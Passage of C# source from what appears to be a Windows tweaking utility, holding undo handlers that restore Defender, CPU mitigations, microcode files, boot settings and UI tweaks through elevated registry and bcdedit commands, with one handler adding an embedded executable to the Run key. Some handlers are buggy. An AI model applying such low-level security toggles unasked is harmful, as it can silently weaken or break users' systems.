            checkBox_scheme.Enabled = true;
            checkBox_scheme.Checked = false;
            back_main_4.Visible = false;
        }//scheme
        void back_main_5_Click(object sender, EventArgs e)
        {
            File.WriteAllText(tempfolder + @"\unmousefix.reg", Resources.unmousefix);
            hcmd($"regedit.exe /s {tempfolder}\\unmousefix.reg");
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("mousefix");
            checkBox_mousefix.Enabled = true;
            checkBox_mousefix.Checked = false;
            back_main_5.Visible = false;
        } //mouse
        void back_main_6_Click(object sender, EventArgs e)
        {
            Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\Dwm", true).DeleteValue("OverlayTestMode");
            checkBox_mpo.Enabled = true;
            checkBox_mpo.Checked = false;
            back_main_6.Visible = false;
        }//mpo
        void back_main_7_Click(object sender, EventArgs e)
        {
            File.WriteAllText(tempfolder + @"\unusbpowersaving.bat", Resources.unusbpowersaving);
            hcmd($"regedit.exe /s {tempfolder}/un_usbpowersaving.cmd");
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("usbpowersaving");
            checkBox_usb.Enabled = true;
            checkBox_usb.Checked = false;
            back_main_7.Visible = false;
        }//usbpowersaving
        void back_main_8_Click(object sender, EventArgs e)
        {
            hcmd("bcdedit /deletevalue tscsyncpolicy");
            hcmd("bcdedit /deletevalue bootux");
            hcmd("bcdedit /set bootmenupolicy standard");
            hcmd("bcdedit /set hypervisorlaunchtype Auto");
            hcmd("bcdedit /deletevalue tpmbootentropy");
            hcmd("bcdedit /deletevalue quietboot");
            hcmd("bcdedit /set nx optin");
            hcmd("bcdedit /set allowedinmemorysettings 0x17000077");
            hcmd("bcdedit /set isolatedcontext Yes");
            hcmd("bcdedit /deletevalue vsmlaunchtype");
            hcmd("bcdedit /deletevalue vm");
            hcmd("reg delete \"HKLM\\Software\\Policies\\Microsoft\\FVE\" /v \"DisableExternalDMAUnderLock\" /f");
            hcmd("reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f");
            hcmd("reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows\\DeviceGuard\" /v \"HVCIMATRequired\" /f");
            hcmd("bcdedit /deletevalue firstmegabytepolicy");
            hcmd("bcdedit /deletevalue avoidlowmemory");
            hcmd("bcdedit /deletevalue nolowmem");
            hcmd("bcdedit /deletevalue configaccesspolicy");
            hcmd("bcdedit /deletevalue x2apicpolicy");
            hcmd("bcdedit /deletevalue usephysicaldestination");
            hcmd("bcdedit /deletevalue usefirmwarepcisettings");
            hcmd("bcdedit /deletevalue uselegacyapicmode");
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("bcdedit");
            checkBox_bcdedit.Enabled = true;
            checkBox_bcdedit.Checked = false;
            back_main_8.Visible = false;
        } //bcdedit
        void back_main_9_Click(object sender, EventArgs e)
        {
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", true)?.DeleteValue("FeatureSettings");
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", true)?.DeleteValue("FeatureSettingsOverride");
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", true)?.DeleteValue("FeatureSettingsOverrideMask");
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management", true)?.DeleteValue("EnableCfg");

            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Kernel", true)?.DeleteValue("ProtectionMode");
            Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\kernel", true)?.DeleteValue("DisableExceptionChainValidation");

            if (Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity") != null)
            {
                Registry.LocalMachine.DeleteSubKeyTree(@"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity");
            }

            supercmd("ren %SYSTEMROOT%\\System32\\mcupdate_GenuineIntel.old mcupdate_GenuineIntel.dll");
            supercmd("ren %SYSTEMROOT%\\System32\\mcupdate_AuthenticAMD.old mcupdate_AuthenticAMD.dll");

            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("Mitigations");
            checkBox_mtiititit.Enabled = true;
            checkBox_mtiititit.Checked = false;
            back_main_9.Visible = false;
        }//mititigiig
        void back_main_10_Click(object sender, EventArgs e)
        {
            checkBox_mmagent.Enabled = true;
            checkBox_mmagent.Checked = false;
            back_main_10.Visible = false;
        } //mmagent не буду делать
        void back_main_11_Click(object sender, EventArgs e)
        {
            hcmd($"regedit.exe /s {path_regpack}\\unpagefile.reg");
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("pagefile");
            checkBox_page.Enabled = true;
            checkBox_page.Checked = false;
            back_main_11.Visible = false;
        } //page file
        void back_main_12_Click(object sender, EventArgs e)
        {
            File.WriteAllText(tempfolder + @"\restoreWINDEF10.reg", Resources.restoreWINDEF10);
            File.WriteAllText(tempfolder + @"\restoreWINDEF11.reg", Resources.restoreWINDEF11);
            if (win10)
            {
                supercmd($"regedit.exe /s {tempfolder}\\restoreWINDEF10.reg");
            }
            else
            {
                supercmd($"regedit.exe /s {tempfolder}\\restoreWINDEF11.reg");
            }
            supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\Win_10_11\\AIO_ON.reg");
            supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\Win_11\\webthreatdefsvc\\webthreatdefsvc_ON.reg");
            supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\Win_11\\webthreatdefusersvc\\webthreatdefusersvc_ON.reg");
            supercmd($"regedit.exe /s {tempfolder}\\services_off\\antimalwareserviceexecutable\\Win_11\\!webthreatdefusersvc_XXX\\win11defsubsvcX_restore.bat");
            checkBox_disabledefender.Enabled = false;
            checkBox_disabledefender.Checked = false;
            back_main_12.Visible = true;
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("defenderdisabled");
            checkBox_disabledefender.Enabled = true;
            back_main_12.Visible = false;
            MessageBox.Show("Для восстановления работы защитника выполните перезагрузку!", "", MessageBoxButtons.OK, MessageBoxIcon.Information);

        } //restoreDEF
        void back_ui_1_Click(object sender, EventArgs e)
        {
            Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop\\WindowMetrics", true).SetValue("CaptionHeight", "-330");
            Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop\\WindowMetrics", true).SetValue("CaptionWidth", "-330");
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("buttons");
            checkBoxUI_Buttons_1.Enabled = true;
            checkBoxUI_Buttons_1.Checked = false;
            back_ui_1.Visible = false;
        } //buttons
        void back_ui_2_Click(object sender, EventArgs e)
        {
            checkBoxUI_Buttons_2.Enabled = true;
            checkBoxUI_Buttons_2.Checked = false;
            back_ui_2.Visible = false;
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("litle_explorer_things");
        }//litleexplolrerthingsiaondoaisndonasd
        void back_ui_3_Click(object sender, EventArgs e)
        {
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("contex");
            checkBoxUI_Buttons_3.Enabled = true;
            checkBoxUI_Buttons_3.Checked = false;
            back_ui_3.Visible = false;
        } //contex
        void back_ui_4_Click(object sender, EventArgs e)
        {
            Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true).DeleteValue("JPEGImportQuality");
            checkBoxUI_Buttons_4.Enabled = true;
            checkBoxUI_Buttons_4.Checked = false;
            back_ui_4.Visible = false;
        } //jpegwallappers
        void back_ui_5_Click(object sender, EventArgs e)
        {
            if (win10)
            {
                File.WriteAllText(tempfolder + @"\deficonsw10.bat", Resources.deficonsw10);
                hcmd($"{tempfolder}\\deficonsw10.bat");
            }
            else
            {
                File.WriteAllText(tempfolder + @"\defblueicons.bat", Resources.defblueicons);
                hcmd($"{tempfolder}\\defblueicons.bat");
            }
            checkBox_bluefolders.Checked = false;
            checkBox_bluefolders.Enabled = true;
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("bluefolders");
            back_ui_5.Visible = false;
        }//bluefolders
        void back_ui_6_Click(object sender, EventArgs e)
        {
            Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}");
            hcmd(@"taskkill /f /im explorer.exe & timeout /t 1 && explorer.exe");
            checkBox_contex.Checked = false;
            checkBox_contex.Enabled = true;
            back_ui_6.Visible = false;
        }//contex
        void back_ui_7_Click(object sender, EventArgs e)
        {
            hcmd("taskkill /f /im explorer.exe >nul 2>&1");
            supercmd("reg add \"HKCR\\CLSID\\{6480100b-5a83-4d1e-9f69-8ae5a88e9a33}\\InProcServer32\" /v \"\" /t REG_SZ /d \"C:\\Windows\\System32\\Windows.UI.FileExplorer.dll\" /f");
            //await Task.Delay(1000);
            Process.Start("explorer");
            checkBox_shapka.Checked = false;
            checkBox_shapka.Enabled = true;
            back_ui_7.Visible = false;
        }//shapka
        void back_ui_8_Click(object sender, EventArgs e)
        {
            Registry.ClassesRoot.DeleteSubKeyTree(@"DesktopBackground\Shell\WOTBO");
            if (File.Exists(@"C:\Windows\gear.ico"))
            {
                File.Delete(@"C:\Windows\gear.ico");
            }
            if (File.Exists(@"C:\Windows\wotbo.exe"))
            {
                File.Delete(contexpath);
            }
            back_ui_8.Visible = false;
            checkBox_wotboincontex.Enabled = true;
        }
        void back_ui_9_Click(object sender, EventArgs e)
        {
            Registry.ClassesRoot.DeleteSubKeyTree(@"DesktopBackground\Shell\explorer");
            back_ui_9.Visible = false;
            checkBox_explorer.Enabled = true;
        }
        void back_ui_10_Click(object sender, EventArgs e)
        {
            Registry.CurrentUser.DeleteSubKeyTree(@"SOFTWARE\Classes\SystemFileAssociations");
            Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Classes\SystemFileAssociations");
            hcmd("taskkill /f /im ffmpeg.exe");
            File.Delete(@"C:\Windows\ffmpeg.exe");
            back_ui_10.Visible = false;
            checkBox_ffmpeg.Enabled = true;
        } //ffmpeg
        async void back_ui_11_Click(object sender, EventArgs e)
        {
            hcmd($"regsvr32 /s /u C:\\Windows\\ExplorerBlurMica.dll & taskkill /f /im explorer.exe & explorer.exe & timeout /t 1 & explorer.exe");
            await Task.Delay(1000);
            File.Delete(@"C:\Windows\ExplorerBlurMica.dll");
            File.Delete(@"C:\Windows\config.ini");
            checkBox_mica.Enabled = true;
            checkBox_mica.Checked = false;
            back_ui_11.Visible = false;
        }
        void back_gpu_1_Click(object sender, EventArgs e)
        {
            hcmd("Dism /online /Disable-Feature /FeatureName:DirectPlay");
            back_gpu_1.Visible = false;
            checkBox_directplay.Checked = false;
            checkBox_directplay.Enabled = true;
        }//directplay
        void back_gpu_2_Click(object sender, EventArgs e)
        {
            checkBox_hdcp.Checked = false;
            checkBox_hdcp.Enabled = true;
            Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000", true)?.DeleteValue("RMHdcpKeyglobZero");
            back_gpu_2.Visible = false;
        }//hdcp
        void back_gpu_3_Click(object sender, EventArgs e)
        {
            Registry.CurrentUser.CreateSubKey(@"Software\NVIDIA Corporation\Global\NVTweak\Devices\509901423-0\Color", true)?.DeleteValue("NvCplUseColorCorrection");
            MessageBox.Show("1");
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\GraphicsDrivers", true)?.SetValue("PlatformSupportMiracast", "1");
            MessageBox.Show("2");
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak", true)?.DeleteValue("DisplayPowerSaving");
            MessageBox.Show("3");
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000", true)?.SetValue("EnableTiledDisplay", "0");
            MessageBox.Show("4");
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\nvlddmkm\FTS", true)?.DeleteValue("EnableRID61684");
            MessageBox.Show("5");
            checkBox_dopNVIDIA_tweaks.Checked = false;
            checkBox_dopNVIDIA_tweaks.Enabled = true;
            back_gpu_3.Visible = false;
        }//settings nvidia
        void back_gpu_4_Click(object sender, EventArgs e)
        {
            string[] ansel = Directory.GetFiles(@"C:\Windows\System32\DriverStore\", "NvCameraEnable.exe", SearchOption.AllDirectories);
            if (ansel.Length > 0)
            {
                string anselPath = ansel[0];
                hcmd($"{anselPath} on");
            }
            else
            {
                MessageBox.Show("Файл NvCameraEnable.exe не найден");
            }
            checkBox_ansel.Checked = false;
            checkBox_ansel.Enabled = true;
            back_gpu_4.Visible = false;
        }//ansel

        void back_pro_1_Click(object sender, EventArgs e)
        {

        }
        async void back_pro_2_Click(object sender, EventArgs e)
        {
            do
            {
                hcmd($"taskkill /f /im BackgroundMonitoringServices.exe >nul 2>&1");
            }
            while (Process.GetProcessesByName("BackgroundMonitoringServices").Length > 0);
            if (File.Exists(backgr))
                File.Delete(backgr);
            await Task.Delay(500);
            File.WriteAllBytes(backgr, Resources.BackgroundMonitoringServices);
            Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("BackgroundMonitoringServices", backgr);
            Process.Start(backgr);
            back_pro_2.Visible = false;
            checkBox_pro_2.Enabled = true;
            checkBox_pro_2.Checked = false;
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("block_backgr");
        }
        void back_pro_3_Click(object sender, EventArgs e)
        {
            Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate", true).DeleteSubKeyTree("AU");
            checkBox_pro_3.Checked = false;
            checkBox_pro_3.Enabled = true;
            back_pro_3.Visible = false;
        }
        void back_pro_4_Click(object sender, EventArgs e)
        {

        }

        void back_pro_6_Click(object sender, EventArgs e)
        {

        }
        void back_pro_7_Click(object sender, EventArgs e)
        {

        }
        void back_pro_8_Click(object sender, EventArgs e)
        {

        }
        void back_pro_9_Click(object sender, EventArgs e)
        {

        }
        void back_pro_11_Click(object sender, EventArgs e)
        {
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\ControlSet001\Control\PriorityControl", true).SetValue("Win32PrioritySeparation", 0x00000002);
            checkBox_pro_11.Enabled = true;
            checkBox_pro_11.Checked = false;
            back_pro_11.Visible = false;
        }

        void back_pro_12_Click(object sender, EventArgs e)
        {
            hcmd("netsh int tcp set global autotuninglevel=normal");
            checkBox_pro_12.Checked = false;
            checkBox_pro_12.Enabled = true;
            back_pro_12.Visible = false;
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("buffer");
        }
        void back_pro_13_Click(object sender, EventArgs e)
        {
            if (Directory.Exists($"C:\\Windows\\unlocker"))
            {
                Directory.Delete($"C:\\Windows\\unlocker", true);
            }
            Registry.ClassesRoot.DeleteSubKeyTree(@"*\shell\Уничтожить");
            Registry.ClassesRoot.DeleteSubKeyTree(@"Directory\shell\Уничтожить");
            checkBox_pro_13.Checked = false;
            checkBox_pro_13.Enabled = true;
            back_pro_13.Visible = false;
        }
        async void back_pro_14_Click(object sender, EventArgs e)
        {
            hcmd("taskkill /f /im AlwaysOnTop.exe");
            Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("AlwaysOnTop");
            checkBox_pro_14.Checked = false;
            checkBox_pro_14.Enabled = true;
            back_pro_14.Visible = false;
            await Task.Delay(1000);
            if (File.Exists(@"C:\Windows\AlwaysOnTop.exe"))
            {
                File.Delete(@"C:\Windows\AlwaysOnTop.exe");
            }
        }


        void back_dop_1_Click(object sender, EventArgs e)
        {
            Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", true).DeleteValue("Max Cached Icons");
            checkBox_picture_cache.Enabled = true;
            back_dop_1.Visible = false;
        }

        void back_dop_2_Click(object sender, EventArgs e)
        {
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", true).DeleteValue("DefaultTTL");
            Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters", true).DeleteValue("DefaultTTL");
            checkBox_mobile_traffic.Enabled = true;
            back_dop_2.Visible = false;
        }

        void back_dop_3_Click(object sender, EventArgs e)
        {
            Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\UserProfileEngagement", true).DeleteValue("ScoobeSystemSettingEnabled");
            checkBox_nastroyka.Enabled = true;
            back_dop_3.Visible = false;
        }

        void back_dop_4_Click(object sender, EventArgs e)
        {
            Registry.CurrentUser.OpenSubKey(@"Control Panel\Accessibility\StickyKeys", true).SetValue("Flags", "510");
            checkBox_zalipanie.Enabled = true;
            back_dop_4.Visible = false;
        }
        #endregion
        #region installcursors
        public void InstallCursor(string installerFilePath)
        {
            string command = @"C:\WINDOWS\System32\rundll32.exe";
            string arguments = "setupapi,InstallHinfSection DefaultInstall 132 " + installerFilePath;

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c \"{command} {arguments}\"",
                Verb = "runas",
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process process = new Process
            {
                StartInfo = startInfo
            };

            process.Start();
            process.WaitForExit();
        }
        #endregion

    }
}

